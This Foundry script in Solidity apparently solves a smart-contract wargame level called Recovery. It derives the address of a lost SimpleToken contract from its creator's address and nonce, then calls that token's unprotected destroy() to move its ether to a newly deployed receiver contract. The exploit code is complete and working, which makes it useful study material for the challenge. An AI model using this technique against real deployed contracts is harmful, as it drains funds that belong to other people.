// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Recovery.sol";
import {Script} from "forge-std/Script.sol";

import {console} from "forge-std/console.sol";

contract AttackerContract {
    constructor () {}

    receive() external payable {
        console.log("AttackerContract received : ", msg.value);
    }   
}

contract RecoveryAttack is Script {
    Recovery public recovery = Recovery(0xcfe978A0510cE38415F850c8b1472e3afc68daB5);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        address simpleTokenAddress = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(recovery), bytes1(0x01))))));

        AttackerContract attackerContract = new AttackerContract();
        SimpleToken simpleToken = SimpleToken(payable(simpleTokenAddress));

        simpleToken.destroy(payable(address(attackerContract)));

        vm.stopBroadcast();
    }
}